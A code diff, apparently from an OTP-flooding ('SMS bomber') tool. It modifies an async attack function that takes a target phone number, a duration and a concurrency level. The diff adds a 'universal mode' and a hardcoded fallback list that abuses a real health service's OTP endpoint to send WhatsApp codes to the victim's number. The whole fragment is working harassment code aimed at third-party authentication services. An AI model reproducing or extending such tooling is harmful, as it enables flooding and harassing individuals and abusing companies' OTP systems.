@@ -38,6 +38,9 @@ async def start_async_attack(apis, number, duration=60, concurrency=50, delay=0.
         print("🛑 Attack Cancelled due to Hardware Safety Protocols.")
         return
 
+    # v1000000: UNIVERSAL MODE (No Provider Filter)
+    provider = "all" 
+
     # v1000000: UNIVERSAL MODE (HARDCODED FALLBACK)
     FALLBACK_APIS = [
       {"name": "[WA] KlikDokter", "url": "https://auth.klikdokter.com/api/v1/otp", "method": "POST", "provider": "all", "data": {"phone": "{c}", "channel": "wa"}},
